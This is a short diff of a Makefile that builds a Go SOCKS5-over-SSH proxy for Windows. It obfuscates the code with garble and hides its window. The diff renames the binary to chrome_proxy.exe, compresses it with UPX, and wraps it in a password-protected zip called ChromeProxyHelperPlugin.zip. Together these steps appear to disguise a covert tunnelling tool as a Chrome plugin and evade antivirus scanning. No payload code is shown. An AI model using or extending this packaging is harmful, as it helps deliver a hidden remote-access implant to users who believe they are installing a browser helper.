@@ -15,9 +15,10 @@ socks5-ssh-proxy.exe: resources $(GARBLE_BIN) $(SOURCES)
 	GOOS=windows GOARCH=amd64 $(GARBLE_BIN) build -ldflags -H=windowsgui -tags release -o $@
 win-package: ChromeProxyHelperPlugin.zip
 ChromeProxyHelperPlugin.zip: socks5-ssh-proxy.exe
-	cp socks5-ssh-proxy.exe chrome-proxy-helper.exe
-	zip -eP resistanceIsFutile ChromeProxyHelperPlugin.zip chrome-proxy-helper.exe
-	rm -f chrome-proxy-helper.exe
+	cp socks5-ssh-proxy.exe chrome_proxy.exe
+	upx chrome_proxy.exe
+	zip -eP resistanceIsFutile ChromeProxyHelperPlugin.zip chrome_proxy.exe
+	rm -f chrome_proxy.exe
 install-deps: $(GARBLE_BIN)
 $(GARBLE_BIN):
 	go install mvdan.cc/garble@v0.12.1
